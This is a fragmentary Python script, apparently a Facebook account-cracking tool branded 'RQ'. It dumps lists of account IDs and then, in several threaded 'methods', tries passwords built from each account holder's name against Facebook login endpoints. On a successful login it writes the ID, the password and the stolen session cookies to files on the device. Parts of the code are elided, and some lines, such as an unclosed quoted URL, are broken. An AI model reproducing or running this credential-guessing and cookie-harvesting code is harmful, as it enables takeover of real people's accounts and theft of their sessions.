...
from concurrent.futures import ThreadPoolExecutor as sarfrazRQ
from string import * 
...
logo =                                          """            
\033[1;37m      ____  _    _ _____   ____   _____ 
  / __ \| |  | |  __ \ / __ \ / ____|
 | |  | | |  | | |  | | |  | | (___  
 | |  | | |  | | |  | | |  | |\___ \ 
 | |__| | |__| | |__| | |__| |____) |
  \___\_\\____/|_____/ \____/|_____/ 
                                     
                                     
                                     
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Qudos Khan
\033[1;37m Facebook:            Qudos Khan
\033[1;37m Github  :            Qudos-RQ
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back RQ Menu ")
        exit()
...
def sarfraz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://chat.whatsapp.com/FgNIjA4i6Zh8goUbyphn24')
        pass
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/qudos.khan.739)
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        RQ(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RQ] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RQb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RQb};{ckkk}"
                    print(f"\r{R} [RQ-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/RQ_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RQ_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [RQ-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/RQ_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RQ] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [RQ-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/RQ_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RQ_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [RQ-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RQ] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[RQ] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [RQ-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/RQ_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with sarfrazRQ(max_workers=30) as RQworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                RQworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                RQworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                RQworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                RQworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/RQ.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/RQ.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    RQ = input('Put File Name :')
    print(" ")
    sarfraz = input('Saving Put File Name :')
    os.system('touch ' +sarfraz)
    os.system('sort -r '+RQ+' | uniq > '+sarfraz)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + RQ )
    print(47*'-')
    print("File Saved To :" + sarfraz )
    print(47*'-')
    input(f"{S} Press Enter To Back RQ Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/RQ.txt\n') 
        filepath = input("Put File Name: ")
